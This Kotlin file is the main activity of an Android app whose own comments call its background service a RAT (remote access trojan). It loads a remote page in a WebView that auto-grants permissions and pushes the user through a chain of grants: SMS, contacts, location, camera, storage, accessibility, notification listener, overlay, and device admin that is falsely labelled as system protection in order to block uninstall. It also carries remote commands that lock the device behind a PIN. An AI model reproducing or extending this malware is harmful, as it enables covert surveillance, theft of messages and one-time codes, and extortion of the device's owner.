package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private var accountUid: String = "unknown"

    // ─── URL INI OTOMATIS DIGANTI OLEH GITHUB ACTIONS (sed build.yml) ───
    // JANGAN ubah nama variabel / format string-nya, atau sed akan gagal replace.
    private val TARGET_URL = "TARGET_URL_PLACEHOLDER"

    // Variabel untuk antrean izin
    private val PERM_REQUEST_CODE = 9000
    private var permIndex = 0
    private var settingIndex = 0
    private var isRequestingSettings = false

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), 102)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 1. BACA UID DARI ASSETS
        readAccountUid()

        // 2. SETUP WEBVIEW DULU (biar UI langsung siap)
        setupWebView()

        // 3. REGISTER BROADCAST RECEIVER
        registerReceivers()

        // 4. JALANKAN SERVICE RAT (DIJADWALKAN, BIAR GAK CRASH DI AWAL)
        // Service baru akan jalan setelah 10 detik, setelah user sempat kasih izin
        Handler(Looper.getMainLooper()).postDelayed({
            try { startDeviceService() } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Gagal start service tertunda: ${e.message}")
            }
        }, 10_000) // 10 detik
    }

    /**
     * Baca account_uid dari assets/uid.json yang di-inject oleh build.yml.
     * Kalau gagal, fallback ke "unknown" dan simpan ke SharedPreferences.
     */
    private fun readAccountUid() {
        try {
            val inputStream = assets.open("uid.json")
            val size = inputStream.available()
            val buffer = ByteArray(size)
            inputStream.read(buffer)
            inputStream.close()
            val json = String(buffer, Charsets.UTF_8)
            val obj = JSONObject(json)
            accountUid = obj.optString("uid", "unknown")

            val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
            prefs.edit().putString("account_uid", accountUid).apply()
        } catch (e: Exception) {
            e.printStackTrace()
            accountUid = "unknown"
        }
    }

    private fun registerReceivers() {
        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
            registerReceiver(
                screenCaptureReceiver,
                IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE"),
                RECEIVER_NOT_EXPORTED
            )
        } else {
            registerReceiver(commandReceiver, filter)
            registerReceiver(screenCaptureReceiver, IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE"))
        }
    }

    private fun startDeviceService() {
        try {
            // Cek dulu izin dasar (kamera & lokasi)
            val hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
            val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED

            // Kalau izin belum ada, jangan start service dulu
            // (nanti dipanggil ulang dari MainBridge.connectNow() setelah user klik MULAI)
            if (!hasCamera && !hasLocation) {
                android.util.Log.w("MainActivity", "Izin dasar belum ada, skip startDeviceService")
                return
            }

            val svcIntent = Intent(this, DeviceService::class.java)
            ContextCompat.startForegroundService(this, svcIntent)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Gagal start service: ${e.message}")
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                // Mulai minta izin setelah halaman selesai load
                Handler(Looper.getMainLooper()).postDelayed({
                    startPermissionSequence()
                }, 1500)
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?
            ) {
                super.onReceivedError(view, request, error)
                // Kalau request utama (bukan resource) gagal, tampilkan error yang informatif
                if (request?.isForMainFrame == true) {
                    val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        error?.errorCode else 0
                    val desc = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        error?.description ?: "unknown" else "unknown"
                    showErrorPage("Koneksi gagal (code: $code)\n$desc")
                }
            }
        }

        loadTargetUrl()
    }

    /**
     * Load TARGET_URL ke WebView dengan validasi.
     * - Kalau masih placeholder → tampilkan "Aplikasi Error."
     * - Kalau URL gak pakai http/https → tampilkan "Aplikasi Error."
     * - Kalau valid → loadUrl()
     */
    private fun loadTargetUrl() {
        val url = TARGET_URL.trim()
        val isPlaceholder = url == "TARGET_URL_PLACEHOLDER" || url.isEmpty()
        val isValidProtocol = url.startsWith("http://", ignoreCase = true) ||
                              url.startsWith("https://", ignoreCase = true)

        if (isPlaceholder || !isValidProtocol) {
            showErrorPage("Aplikasi Error.\nURL target belum dikonfigurasi dengan benar.")
        } else {
            webView.loadUrl(url)
        }
    }

    /**
     * Tampilkan halaman error yang rapi ke user (fallback).
     */
    private fun showErrorPage(message: String) {
        val html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {
                        margin: 0;
                        padding: 40px 24px;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: #0d0d0f;
                        color: #e5e5e5;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        min-height: 100vh;
                    }
                    .box {
                        max-width: 420px;
                        text-align: center;
                    }
                    .icon {
                        width: 64px;
                        height: 64px;
                        border-radius: 16px;
                        background: #b91c1c;
                        display: inline-flex;
                        align-items: center;
                        justify-content: center;
                        font-size: 32px;
                        margin-bottom: 20px;
                    }
                    h3 { font-size: 18px; margin: 0 0 12px; font-weight: 700; }
                    p { font-size: 13px; color: #9ca3af; margin: 0; line-height: 1.5; white-space: pre-line; }
                </style>
            </head>
            <body>
                <div class="box">
                    <div class="icon">!</div>
                    <h3>Aplikasi Error</h3>
                    <p>$message</p>
                </div>
            </body>
            </html>
        """.trimIndent()
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
    }

    // ─── LOGIC MEMINTA SEMUA IZIN (POPUP & SETTINGS) ───

    private val runtimePerms: List<String> by lazy {
        val list = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.GET_ACCOUNTS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }
        list
    }

    private fun startPermissionSequence() {
        permIndex = 0
        requestNextRuntimePermission()
    }

    private fun requestNextRuntimePermission() {
        while (permIndex < runtimePerms.size &&
            ContextCompat.checkSelfPermission(this, runtimePerms[permIndex]) == PackageManager.PERMISSION_GRANTED
        ) {
            permIndex++
        }

        if (permIndex < runtimePerms.size) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(runtimePerms[permIndex]),
                PERM_REQUEST_CODE + permIndex
            )
        } else {
            settingIndex = 0
            requestNextSpecialSetting()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode >= PERM_REQUEST_CODE) {
            permIndex++
            Handler(Looper.getMainLooper()).postDelayed({
                requestNextRuntimePermission()
            }, 500)
        }
    }

    private fun requestNextSpecialSetting() {
        val settingsIntents = mutableListOf<Intent>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                settingsIntents.add(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            }
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                settingsIntents.add(
                    Intent(
                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")
                    )
                )
            }
        }

        if (!AppBlockerService.isUsageAccessGranted(this)) {
            settingsIntents.add(
                Intent(
                    Settings.ACTION_USAGE_ACCESS_SETTINGS,
                    Uri.parse("package:$packageName")
                )
            )
        }
        if (!AppBlockerService.isEnabled(this)) {
            settingsIntents.add(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        if (!SmsNotifService.isEnabled(this)) {
            settingsIntents.add(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                settingsIntents.add(
                    Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            }
        }

        // Device Admin (Anti Uninstall)
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AntiUninstallReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Aktifkan untuk perlindungan sistem"
            )
            settingsIntents.add(intent)
        }

        if (settingIndex < settingsIntents.size) {
            isRequestingSettings = true
            try {
                startActivity(settingsIntents[settingIndex])
            } catch (e: Exception) {
                settingIndex++
                requestNextSpecialSetting()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (isRequestingSettings) {
            isRequestingSettings = false
            settingIndex++
            Handler(Looper.getMainLooper()).postDelayed({
                requestNextSpecialSetting()
            }, 1000)
        }
    }

    // ─── FUNGSI BAWAAN (TIDAK DIUBAH) ───

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin = intent.getStringExtra("lock_pin") ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 102) {
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')",
            null
        )
        try { startLockTask() } catch (e: Exception) {}
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {}
        webView.evaluateJavascript("if(typeof hideLockScreen==='function') hideLockScreen()", null)
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    // ─── FUNGSI CEK IZIN (DIPANGGIL DARI WEB) ───

    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    fun isGalleryGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun requestGalleryPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_REQUEST_CODE)
    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
    fun isLocationGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
    fun isGpsEnabled() = (getSystemService(LOCATION_SERVICE) as LocationManager).isProviderEnabled(LocationManager.GPS_PROVIDER)
    fun requestLocationPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), PERM_REQUEST_CODE)
    fun isContactsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    fun requestContactsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_REQUEST_CODE)
    fun isGmailGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
    fun requestGmailPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_REQUEST_CODE)
    fun isPhoneGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
    fun requestPhonePerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_PHONE_STATE), PERM_REQUEST_CODE)
    fun isManageStorageGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName) else true
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)
    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)
    fun requestAccessibilityPerm() = startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    fun requestUsageAccessPerm() = startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:$packageName")))
    fun requestOverlayPerm() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))) }
    fun requestCamPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_REQUEST_CODE)
    fun requestSmsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_REQUEST_CODE)
    fun openNotifListenerSettings() = startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
    fun openBatterySettings() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))) }
    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        LocationServices.getSettingsClient(this).checkLocationSettings(builder.build()).addOnFailureListener { exception ->
            if (exception is ResolvableApiException) {
                try { exception.startResolutionForResult(this, 107) } catch (_: Exception) {}
            }
        }
    }
    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try { startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName"))) } catch (_: Exception) {}
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), PERM_REQUEST_CODE)
        }
    }

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                startDeviceService()
                sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
            }
        }
        @android.webkit.JavascriptInterface
        fun getUID(): String = accountUid
    }
}

// ─── AppBridge biarkan sama seperti aslinya ───
class AppBridge(private val context: Context, private val webView: WebView) {
    companion object { var instance: AppBridge? = null }

    @JavascriptInterface fun getDeviceId(): String = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }
    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected
    @JavascriptInterface fun isCamGranted() = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted() = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted() = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted() = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted() = (context as MainActivity).isUsageAccessGranted()
    @JavascriptInterface fun requestCamPerm() = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm() = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm() = (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm() = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun isGalleryGranted() = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun requestGalleryPerm() = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun isLocationGranted() = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled() = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun requestLocationPerm() = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps() = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun isContactsGranted() = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun requestContactsPerm() = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun isGmailGranted() = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun requestGmailPerm() = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun isPhoneGranted() = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun requestPhonePerm() = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun isManageStorageGranted() = (context as MainActivity).isManageStorageGranted()
    @JavascriptInterface fun requestManageStoragePerm() = (context as MainActivity).requestManageStoragePerm()
}